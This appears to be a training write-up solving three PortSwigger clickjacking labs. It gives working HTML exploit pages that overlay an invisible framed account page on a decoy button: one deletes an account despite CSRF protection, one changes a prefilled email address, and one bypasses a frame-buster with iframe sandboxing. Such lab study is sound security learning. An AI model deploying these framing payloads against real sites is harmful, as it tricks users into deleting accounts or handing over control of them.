
## Labs Covered

This write-up focuses on the following **APPRENTICE-level labs** from the PortSwigger Web Security Academy related to **Clickjacking**:

**1 Basic clickjacking with CSRF token protection**
<blockquote>
This lab demonstrates bypassing CSRF protection by tricking a logged-in user into clicking a hidden framed page
</blockquote>

**2 Clickjacking with form input data prefilled from a URL parameter**
 <blockquote>
  This lab shows how attackers prefill form fields via URL parameters and use clickjacking to submit the request.
 </blockquote>

**3 Clickjacking with a frame buster script**
<blockquote>
  This lab focuses on bypassing a client-side frame-busting defense to successfully perform clickjacking.
</blockquote>

---

### LAB 1 - Basic clickjacking with CSRF token protection

### Lab Description

![lab1-desc](https://github.com/user-attachments/assets/b363bb8d-55e1-4d90-9a67-c945f8d487d4)

### Solution  
This lab contains login functionality and a delete account button protected by a CSRF token. A user is tricked into clicking elements labeled "click" on a decoy website.

To solve the lab, craft HTML that frames the account page and fools the user into deleting their account.

You can log in using:
```

Username: wiener
Password: peter

````
<img width="561" height="381" alt="image" src="https://github.com/user-attachments/assets/8822d675-8e30-431c-9930-e8f50972788b" />

The delete button is part of a simple form that sends a POST request to `/my-account/delete`. In the message body, a CSRF token is included.

This token prevents me from just faking a complete delete form, as I have no way of knowing it.

## One way of circumventing this is to load two pages:

      • A webpage with arbitrary content that convinces a user to click on it.
      • Show the vulnerable web page in front of it but keep it invisible to the user.

When the user tries to click on my website, the browser will interpret it as a click on the vulnerable page as it is the topmost one.


So my goal is to put something visible behind the invisible Delete account button that the user attempts to click on. The browser interprets this as a click on the button. The CSRF protection does not play any role here. The vulnerable page is received from the real server and contains the valid token.


<img width="862" height="132" alt="image" src="https://github.com/user-attachments/assets/e223dc13-5502-48fc-8897-e803237d7b2a" />



![lab1-1](images/Basic%20clickjacking%20with%20CSRF%20token%20protection/1.png)

```html
<head>
  <style>
    #target_website {
      position: relative;
      width: 600px;
      height: 600px;
      opacity: 0.1;
      z-index: 2;
    }
    #decoy_website {
      position: absolute;
      width: 600px;
      height: 600px;
      z-index: 1;
    }
    #btn {
      position: absolute;
      top: 480px;
      left: 90px;
    }
  </style>
</head>
<body>
  <div id="decoy_website">
    <button id="btn">click</button>
  </div>
  <iframe id="target_website" src="https://id-yours.web-security-academy.net/my-account"></iframe>
</body>
````

![lab1-result1](https://github.com/user-attachments/assets/89f5a12c-e14e-4464-96fa-a6baab78579b)
![lab1-result2](https://github.com/user-attachments/assets/5ce94d83-bb8c-44b7-a9ed-fc24795ce026)

Change the opacity to 0.0000 to make the page invisible:

![lab1-opacity](https://github.com/user-attachments/assets/346ee79e-b398-4c3c-84fd-4a2507e2877b)

Once the victim clicks, lab shows solved:

![lab1-solved](https://github.com/user-attachments/assets/77349e48-5635-4411-822b-ac171560f593)

---

### LAB 2 - Clickjacking with form input data prefilled from a URL parameter

### Lab Description

![lab2-desc](https://github.com/user-attachments/assets/f71c6a75-5009-4552-90ce-974afb50842e)

### Solution
This lab allows email changes by pre-filling form fields using URL parameters. The goal is to trick the user into clicking "Update email" on a decoy site.

Use the same credentials:
`wiener:peter`

The email change functionality is a simple form.


![lab2-form](https://github.com/user-attachments/assets/7c4d0efe-5c3e-455f-94be-73365040f089)

I change the email address of wiener and check the content of the request in Burp:


![lab2-burp](https://github.com/user-attachments/assets/a0da6a58-2244-4836-b1fa-dfd044c881d5)

The correct method is using `?email=` in the iframe URL. JavaScript cannot access iframe due to origin policy.

Prefill email field by navigating to:

`https://.../my-account?email=mail@evil.me`

<img width="855" height="162" alt="image" src="https://github.com/user-attachments/assets/9209ac82-b817-49c0-91e4-9e76bcbae272" />


<img width="977" height="634" alt="image" src="https://github.com/user-attachments/assets/d091bf0b-ca77-4e16-a20e-d37537fab13f" />


```html
<head>
  <style>
    #target_website {
      position: relative;
      width: 600px;
      height: 600px;
      opacity: 0.1;
      z-index: 2;
    }
    #decoy_website {
      position: absolute;
      width: 600px;
      height: 600px;
      z-index: 1;
    }
    #btn {
      position: absolute;
      top: 440px;
      left: 70px;
    }
  </style>
</head>
<body>
  <div id="decoy_website">
    <button id="btn">Click me</button>
  </div>
  <iframe id="target_website" src="https://id.web-security-academy.net/my-account?email=test@test.com"></iframe>
</body>
```

---

### LAB 3 - Clickjacking with a frame buster script

### Lab Description

![lab3-desc](https://github.com/user-attachments/assets/f9d7e280-5267-46a5-a9ee-1c426988d74e)

### Solution

A frame-buster script on the target detects framing by checking if `window != top`. If detected, the page wipes itself clean.

The email change functionality is a simple form, this time with an added script:

<img width="652" height="381" alt="image" src="https://github.com/user-attachments/assets/dfd72b89-47a2-4681-a789-942c287b81a4" />




Frame-busting in action:

<img width="243" height="125" alt="image" src="https://github.com/user-attachments/assets/8efa36da-b6ca-4837-805a-6e632f72ad35" />


To bypass, use iframe sandboxing. `sandbox="allow-forms"` disables scripts but allows form submission:


```html
<head>
  <style>
    #target_website {
      position: relative;
      width: 600px;
      height: 600px;
      opacity: 0.1;
      z-index: 2;
    }
    #decoy_website {
      position: absolute;
      width: 600px;
      height: 600px;
      z-index: 1;
    }
    #btn {
      position: absolute;
      top: 440px;
      left: 70px;
    }
  </style>
</head>
<body>
  <div id="decoy_website">
    <button id="btn">Click me</button>
  </div>
  <iframe id="target_website" src="https://id.web-security-academy.net/my-account?email=test@test.com" sandbox="allow-forms"></iframe>
</body>
```

Deliver exploit to victum and Frame-buster is now bypassed:

<img width="510" height="114" alt="image" src="https://github.com/user-attachments/assets/76774c0f-6929-4558-a9e9-83360371794b" />


Submit the form to solve the lab:

![lab3-solved](https://github.com/user-attachments/assets/43f8b357-7349-41e2-9f8e-5cfeeac06ac9)

---
